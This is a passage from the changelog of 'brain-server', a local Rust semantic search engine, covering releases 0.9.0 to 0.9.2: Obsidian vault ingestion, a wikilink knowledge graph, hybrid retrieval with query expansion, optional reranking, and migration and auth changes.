  fetches a window ≥ k and reranks **before** truncating to k, so a relevant hit
  just below k can be promoted. Guarded by `candidate_window_equals_k_when_disabled`
  and the rerank contract tests.
- **Benchmark is reproducible.** `BENCHMARKS.md` fixes the workload, hardware,
  metrics, and commands; the `bench` feature and `tests/metrics.rs` implement the
  protocol. The metric functions (`recall@k`, `precision@k`, `nDCG@k`, `MRR`) are
  unit-tested with hand-computed values.

### Honest status
- Measured RSS/latency/recall numbers on 4 GB ARM and the ≥100 judged-query corpus
  remain **PENDING** a hardware run. No claim of measured QMD parity is made.

---



## [0.9.2] — "Connect" — 2026-07-11 (released)

External markdown ingestion. brain-server can now ingest an Obsidian vault (or any directory of
markdown) and turn it into a searchable, graph-aware knowledge base — no GPU, no model download,
no API key, no data egress. This is the market wedge: the only zero-dependency local semantic
search engine over a user's notes.

One-shot ingest + graph is OSS. Live file-watcher sync, multi-vault, and the Obsidian plugin UI
remain a paid "Brain Vault" tier (feature-gated `live-sync`, not compiled into this release).

### Added
- **`brain ingest-dir <path>`** — recursive markdown ingest with `source_path` provenance on
  every ingested chunk. Walks are bounded (`MAX_INGEST_FILES=50k`, `MAX_INGEST_BYTES=500MiB`);
  `.brainignore` and Obsidian-internal dirs (`.obsidian/`, `.trash/`) are honored.
- **YAML frontmatter parsing** (`title`, `tags`, `aliases`): stripped before chunking; the
  frontmatter title is preferred for vault ingests (filename fallback). New `src/vault.rs`
  module — pure, no YAML dependency.
- **`[[wikilink]]` → knowledge graph**: `[[Target]]`, `[[Target|Alias]]`, `[[Target#Heading]]`
  become traversable `references` edges. Non-existent targets are created as placeholder
  entities so the graph completes as their files are ingested.
- **Frontmatter → entity metadata**: `tags:` → `tag` entities with `tagged_with` edges;
  `aliases:` → `alias_of` edges (a query for an alias resolves to the note).
- **Vault dedup is scoped to `source_path`**: re-ingesting an unchanged file is a true no-op
  (same chunk ids, zero inserts); a changed file sweeps its old chunks + vec0 rows and
  re-inserts. Content hashes are namespaced with `source_path` (`xxh3_64_with_seed`) so vault
  chunks never collide with memories or other files under the global unique index.
- **Schema**: new `knowledge.source_path TEXT` column (additive migration, NULL for existing /
  interactive rows) + `idx_knowledge_source_path` index.

### Fixed
- **`/graph/entity` and `/graph/traverse` rejected entity names containing spaces**, but note
  titles are stored with spaces (per `NAME_RE`). Both now allow spaces, so the wikilink graph is
  traversable from note titles like `bignay fruit`.

### Changed
- The `/ingest/markdown` DB-write was extracted into `write_markdown_ingest(tx, ...)` so the
  vault dedup/replace/KG logic is unit-testable without the embedding model.
- Title precedence is now caller-aware: vault ingests prefer frontmatter title; interactive
  adds prefer the explicit payload title.

### Tests
- 12 unit tests for `src/vault.rs` (frontmatter + wikilink forms).
- 6 integration tests for vault ingest (source_path storage, idempotent re-ingest, changed-file
  replace, wikilink→references, tags/aliases edges, schema).
- 4 unit tests for the client glob matcher and `.brainignore` honoring.

### Out of scope (paid tier / later releases)
- Live file-watcher sync (`notify` crate), multi-vault, scheduled re-index — paid "Brain Vault"
  tier behind `live-sync`.
- Obsidian plugin UI — paid tier.
- Per-domain isolation — v1.0.0 upgrades an ingested vault from flat `global` content into an
  isolated domain.

---



## [0.9.1] — "Recall" — 2026-07-11 (released)

Phase 2 of the roadmap. The retrieval engine was extracted into `src/search/`
(`#![deny(unsafe_code)]`; all sqlite-vec FFI stays in the crate root) and
hardened end-to-end: hybrid RRF fusion, PRF query expansion with FTS5-weighted
term extraction, an optional cross-encoder rerank tier, and full per-result
provenance on both `/search` and `/recall`. This entry also closes the
v0.9.0 plan gaps that the first-pass audit found (quantization DoD, migration
safety, benchmark/eval harnesses).

### Fixed
- **PRF query expansion actually executes now.** The previous gate compared an
  RRF fused score against an unreachable `0.3` threshold (top RRF ≈ 2/60 ≈
  0.033), so expansion never ran. PRF now uses a deterministic, calibrated gate
  (`prf_should_expand` in `src/search/mod.rs`): expansion fires only when the
  top pass-1 result appears in **both** the dense (`vec0`) and lexical (FTS5)
  lists within a bounded rank.
- **Rerank contract repaired.** The server previously truncated to `k` before
  reranking, so a relevant candidate just below `k` could never be promoted. It
  now over-fetches a candidate window (`RERANK_CANDIDATES = 30`, fixed
  constant) and reranks it *before* truncating to `k`.
- **Silent `since` filter replaced.** The temporal filter is now validated as
  ISO-8601 (RFC3339 or `YYYY-MM-DD HH:MM:SS`) via `normalize_since` and
  rejected if malformed, instead of relying on a lexical string comparison.
- **`/recall` now surfaces per-result provenance.** The handler previously
  computed per-retriever ranks and fused scores internally but dropped them at
  the handler boundary. `RecallHit` now carries an optional `Provenance`
  (populated when `provenance=true` on the request), closing the gap between
  `/search` (which already surfaced it) and the `/recall` + MCP `brain_recall`
  path.
- **Quantization DoD met: no raw f32 JSON in the DB.** All five ingest paths
  (`add_chunk`, `ingest_memory`, `ingest_markdown`, `reindex`, and the `/ingest`
  plugin handler) no longer write the legacy JSON `embeddings.vector` column.
  `vec0` (int8 + binary) is the sole write target. The `embeddings` table is
  retained read-only for one-time backfill of pre-v0.9.0 DBs.
- **Version source-of-truth.** The `mcp` binary now derives `SERVER_VERSION` from
  `env!("CARGO_PKG_VERSION")` (was hardcoded `"0.9.1"`, which would drift on the
  next bump).

### Added
- **Hybrid retrieval with Reciprocal Rank Fusion.** Vector (`vec0` KNN) and
  lexical (FTS5 BM25) retrieval run concurrently on independent pooled read
  connections, then are fused via RRF (`k = 60`, no learned weights). Each result
  records per-retriever ranks + the fused score in its `Provenance`.
- **PRF query expansion with FTS5-weighted term extraction.** Two-pass retrieval:
  pass-1 over-fetches by `PRF_DEPTH`, then high-signal expansion terms are
  extracted from the top hits via the `knowledge_fts_vocab` table
  (`fts5vocab='instance'`) with IDF-weighted BM25-style scoring
  (`score = local_cnt × ln(1 + total_docs/df)`). The expanded query is re-run and
  the two passes are RRF-fused so original-query matches keep their rank
  contribution (`fuse_prf_passes`). Falls back to the pure DF variant when the
  vocab table is unavailable.
- **Anti-injection guardrail for PRF.** Term extraction skips content that trips
  the prompt-injection screen and skips rows flagged as quarantined (`flagged`
  column on `knowledge`). Expansion is also gated on cross-retriever agreement —
  the top pass-1 result must appear in both the dense and lexical lists within a
  bounded rank, so PRF never amplifies a single-retriever outlier.
- **Env-driven PRF configuration** (`PrfConfig::from_env`): `PRF_ENABLED`
  (default `true`), `PRF_DEPTH` (default `10`, clamped 1–100), `PRF_TERMS`
  (default `5`, clamped 1–50), `PRF_MAX_RANK` (default `5`, clamped 0–100).
- **Optional cross-encoder rerank tier.** Feature-gated (`--features rerank`) and
  runtime-gated (`RERANK_ENABLED=true`); the default build is pure-static
  (Model2Vec, zero extra RSS). Uses `BGERerankerV2M3` via
  `fastembed::TextRerank::rerank` (scores query–doc *pairs*), memory-bounded by
  `RERANK_CANDIDATES` (30) and `RERANK_MAX_CHARS` (4096), and fails open to the
  first-stage result. Observable status (`off`/`disabled`/`loading`/`ready`/
  `failed`) surfaced via `/stats`.
- **Metadata-filtered KNN.** `source`, `since` (ISO-8601), and `domain` filters
  are pushed into the `vec0` KNN and FTS5 `WHERE` clauses (parameterized — no
  SQL injection). `source` and `created_at` are declared as `vec0` metadata
  columns.
- **Per-stage latency telemetry** (embed / vector / fts / fusion / prf /
  rerank) recorded in `SearchTelemetry` and emitted at debug level.
  `/search?explain=1` returns per-stage telemetry and the query plan.
- **Structured query** (`lex` / `vec` / `hyde` / `intent`) on `/search` and
  `/recall`: lexical precision via FTS5, semantic + hypothesis via the dense path,
  intent recorded for provenance. Faithful verbatim snippets are attached to each
  hit.
- **Benchmark harness** (`bench` Cargo feature + `src/bin/bench.rs`): ingests
  1k/5k/10k synthetic docs against a running server, records RSS at rest and
  per-batch (via `/health`), ingest throughput, and p50/p95/p99 `/search`
  latency. No new dependencies (reuses the shared HTTP client).
- **Recall eval harness** (`#[ignore]`d test `eval_recall_harness`): loads the
  model, builds a temp DB, and measures recall@5 / recall@10 across pure-vector /
  hybrid / hybrid+PRF configs. Runnable via
  `cargo test --release -- --ignored --nocapture eval_recall_harness`.
- **Migration safety.** Pre-migration `VACUUM INTO` backup (one-shot,
  marker-guarded, skipped for fresh DBs) runs before `run_migration` so the
  rollback path is always possible. Added `migrate_down_0_9_0()` reversibility
  path (drops vec0 + FTS5 + vocab + schema markers; preserves
  `knowledge`/`embeddings`). Post-backfill parity check warns when
  `COUNT(vec_knowledge) < COUNT(embeddings)`.
- **Developer surface:** a `brain` CLI (`src/bin/brain.rs`: query, explain,
  `ingest-dir` with `.brainignore` + content-hash idempotency + `--dry-run`, bench,
  status, doctor), a minimal stdio MCP server (`src/bin/mcp.rs`), and
  `openapi.yaml` — all dependency-light HTTP clients to the running server.
- **Bearer-token auth** (`AUTH_TOKEN`) on non-public routes, with loopback-safe
  defaults, and **retrieval profiles** (`MODEL_PROFILE`: `edge-default`,
  `quality-local`, `multilingual`, `air-gapped`).
- **P2 scaffolding:** `domain`, `observed_at`, `valid_from`, `valid_to` columns on
  `knowledge`, with `domain` scoping in the retrievers (single-DB tagged model).
- **Structure-aware Markdown chunking** (`src/chunker.rs`): `/ingest/markdown` now
  splits documents at heading boundaries (keeping code fences intact), stores one
  chunk per `knowledge` row with `document_id`, `chunk_index`, `heading_path`, and
  1-indexed line span, and embeds each chunk. Added `GET /get/{id}` and
  `POST /multi-get` for stable chunk retrieval.
- **Implemented `POST /ingest`** (was `unimplemented!()`/panic): the structured
  store now embeds, dedups via `content_hash`, routes to the resolved domain, and
  inserts knowledge + vec0 + entities + relations in one transaction.
- **Delete + tombstones:** `DELETE /memory/{id}` now also cleans the `vec_knowledge`
  row (no FK cascade) and records a `tombstones` audit row; deleted content is gone
  from retrieval immediately.
- **`POST /reindex`** rebuilds all `vec_knowledge` from `knowledge`.
  `GET /domains` now lists real per-domain counts.
- **Per-domain DB registry (P2 foundation):** `src/domain_registry.rs` adds a
  `DomainRegistry` with lazy per-domain pools (`brain-<domain>.db`), filename-safe
  domain validation, and a back-compat shim (`BRAIN_MULTI_DB`, off by default =
  legacy single-DB behavior). `/ingest` and `/recall` route through it; `global`
  keeps using the existing `brain.db` (no data migration required).
- **Centroid routing + federation (P2):** `src/domain_router.rs` computes a mean
  embedding centroid per domain (stored in `domain_centroids`, refreshed on ingest
  + `/reindex`) and a pure `route()` with a confidence threshold. In multi-db mode
  `/recall` auto-routes to the best domain (strict isolation) or federates across
  all known domains with a labelled per-hit source domain when no domain is
  confident and `strict=false`.

### Changed
- The optional rerank tier remains **feature-gated and off by default**: it
  compiles only with `--features rerank` and activates only when
  `RERANK_ENABLED=true`. The default edge build is pure-static (Model2Vec, no
  heavy cross-encoder). When enabled it uses the BGE-RerankerV2M3 cross-encoder
  and fails open to the first-stage result.
- **`PRAGMA mmap_size`** (256 MiB, `config::DB_MMAP_SIZE_MIB`) is now set in
  `run_migration`, letting SQLite memory-map the DB without loading it all into
  RSS.
- **CORS loopback guard.** When `CORS_ORIGINS` is unset, the fallback now strips
  non-loopback origins, preventing an accidental open CORS policy in production.
  `CORS_MAX_AGE_SECS` is wired into the `CorsLayer` (was a dead constant).
- **Connection watchdog** now uses the `CONNECTION_WATCHDOG_*` constants instead
  of hardcoded literals.
- **Dead config constants removed** (`ENTITY_NAME_MAX_LENGTH`, `TRAVERSE_MAX_DEPTH`,
  `REQUEST/SEARCH/HEALTH_TIMEOUT_SECS`, `CONTENT/TITLE_MAX_LENGTH`) along with the
  file-level `#![allow(dead_code)]` that was masking them.

### Known limitations / pending
- **No measured QMD parity.** The benchmark harness (`bench` feature) and eval
  harness (`eval_recall_harness`) now exist and are runnable, but the actual
  RSS/latency/recall numbers require a run on the target hardware (4 GB ARM).
  `BENCHMARKS.md` cells remain `PENDING` until then. No claim of measured QMD
  parity is made.
- **Eval corpus is a 10-doc smoke set**, not the ≥100 judged queries over a
  representative corpus that the plan calls for. It gives a directional signal;
  it is not sufficient for a release-blocking parity claim.
- **`perform_search_legacy`** (in-RAM brute-force cosine scan over JSON vectors)
  is retained as a cold-start fallback for pre-migration DBs where `vec0` is empty.
  It is no longer the primary path — `vec0` KNN is.
- **Enterprise SSO / SCIM / ACLs / connectors** are deferred (P4).
  Bearer-token auth (`AUTH_TOKEN`) exists, but OIDC/SAML and connector sandboxing
  do not.
- QMD (Node/TypeScript, ~28k★ mid-2026) remains the more mature local
  document-search product: it uses LLM-generated query expansion and LLM
  cross-encoder reranking via local GGUF models (~2 GB auto-downloaded), plus
  collections, AST chunking, stable SDK/CLI/MCP. Brain Server's deliberate wins
  are its tiny deterministic static-embedding edge profile and (planned) agent
  memory features — not currently measured search-quality superiority.

---



## [0.9.0] — "Quantize" — (released)

Phase 0–1 stabilization: BLOB/sqlite-vec int8+binary storage, FTS5 lexical
index, CORS env-var wiring, `SERVER_VERSION` from `CARGO_PKG_VERSION`, DB path
override, and removal of the TOML annotation engine. See `SPECS.md` for the
full historical record.
